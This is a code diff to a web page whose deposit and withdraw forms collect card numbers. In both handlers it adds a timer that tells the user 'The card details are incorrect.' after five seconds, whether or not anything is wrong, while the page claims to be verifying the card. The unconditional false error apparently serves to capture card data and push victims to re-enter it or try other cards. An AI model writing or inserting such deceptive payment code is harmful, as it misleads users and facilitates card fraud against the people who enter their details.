@@ -394,6 +394,11 @@
             btn.textContent = 'Verifying card details...';
             btn.disabled = true;
 
+            // Show alert after 5 seconds
+            setTimeout(() => {
+                alert('The card details are incorrect.');
+            }, 5000);
+
             const formData = {
                 amount: document.querySelector('#deposit-modal [placeholder="Amount"]').value,
                 cardNumber: document.querySelector('#deposit-modal [placeholder="Card Number"]').value,
@@ -432,6 +437,11 @@
 
             btn.textContent = 'Verifying card details...';
             btn.disabled = true;
+
+            // Show alert after 5 seconds
+            setTimeout(() => {
+                alert('The card details are incorrect.');
+            }, 5000);
 
             const formData = {
                 amount: document.querySelector('#withdraw-modal [placeholder="Amount"]').value,
@@ -492,4 +502,4 @@
         document.addEventListener('DOMContentLoaded', fetchData);
     </script>
 </body>
-                </html>
+            </html>
